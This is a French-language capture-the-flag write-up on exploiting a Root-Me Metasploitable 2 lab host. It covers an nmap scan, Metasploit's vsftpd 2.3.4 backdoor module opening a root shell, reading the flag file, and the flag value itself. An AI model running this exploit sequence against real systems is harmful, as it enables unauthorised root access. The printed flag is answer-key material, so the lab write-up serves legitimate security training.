#CTF->ROOTME
#SALLE 8:VALIDATION
#CTF-ALL-THE-DAY
#-METASPLOITABLE 2
#LE FLAG EST CACHÉE DANS /passwd
#TIME:1H:00Min:00s
#Ted
̀ bash-line`
 
 Tout d'abord avec le lien de la page l'on cherche l'adresse ip avec la commande :
 ̀̀
 #COMMANDS-LINE
 
#host ctf08.root-me.org
#output:ctf08.root-me.org has address 212.129.39.172

Je demarre les outils `nmap && metasploite`

#nmap COMMANS-LINE:
nmap -T4 -A -v ctf08.root-me.org 
~or~
nmap -T4 -A -v 212.129.39.172

#output:
SUITE aux resZultats sortie nous remarquons une liste de ports ouverts (d'ailleurs c'est chelou il y en a un peu trop ,c'est vrai y a 65535 ports mais quand même)

`  
Discovered open port 5900/tcp on 212.129.39.172
Discovered open port 21/tcp on 212.129.39.172
Discovered open port 23/tcp on 212.129.39.172
Discovered open port 111/tcp on 212.129.39.172
Discovered open port 53/tcp on 212.129.39.172
Discovered open port 3306/tcp on 212.129.39.172
Discovered open port 80/tcp on 212.129.39.172
Discovered open port 445/tcp on 212.129.39.172
Discovered open port 139/tcp on 212.129.39.172
.
.
.
Completed SYN Stealth Scan at 01:32 ,33.45s elapsed (1000 total parts)
Scanning 22 service on ctf08.root-me.org (212.129.39.172)
.
.
`
#metasploit 
#COMMANDS-LINE
#Input :
`msfconsole`
 (faut avouer que la maniere dont ça se charge est cool et que l'art ASCII qui s'affiche a chaque demarrage est génial (en plus a chaque démarrage y en a un nouveau)

#search exploit
L'on cherche une faille parmis les port ouvert ,dans mon cas je prend le port 21

#Info

Port--Protocole--Etat--Service--Version 
21     tcp       open   ftp     vsftpd 2.3.4

#Metasploit

#COMMAND-LINE:
`
msf6 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
`
Alors la faille existe bien en plus c'est la même version pour le "vsftpd"

Maintenant nous allons utiliser l'exploit de `msf` pour pouvoir l'exploiter sur la machine virtuelle

`
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
`
Heuresement que l'on a l'adresse ip de la machine au cas je verifie la mienne
AVEC La commande `show options `
#OUTPUT:
`
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options 

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic

`
Bon maintenant l'on eaucune adresse  ne nous ait donnée donc l'on va remplacée l'adresse ip donnée par celle sensée etre locale
#COMMANDS-LINE:set rhost 212.129.39.172
#~*_*~t3d~#
#output
rhost => 212.129.39.172

L'on reverifie si c'est okay avec un autre "show options"

#ouput:
`
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options 

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  212.129.39.172   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
`
Maintenant que ça l'air bon on va faire un exploit pour tenter de voir se qu'on obtiendra de l'adresse ip sur le port 21 (212.129.39.172:21)
#COMMANS-LINE:
exploit
Personnellement je trouve la sortie un peu longue ,mais parmis les lignes sortantes il y en a une assez interessantes ou il etait specifié qu'un shell s'ouvrait
sur l'adresse 10.0.2.15:37997
Alors je tente d'obtenir des info sur ce shell 
 
#COMMANS-LINE:
shell
Bon la des infos sur python 3 apparaissent et l'on nous donne la main en mode root evidemment sur le (sh-3.2). 
Alors je reviens aux bases (â mes bases en linux )
Un simple `ls` a suffit et les dossiers et fichiers ont été listés  et grâce l'indice de depart l'on se souvient que le flag se retrouve dans le fichier "passwd"
qui a été aussi listée donc ,j'affiche l'interieur avec un "cat " et j'observe le flag.


#FLAG:a0cc77b5574a1304b4318b73d930c693



















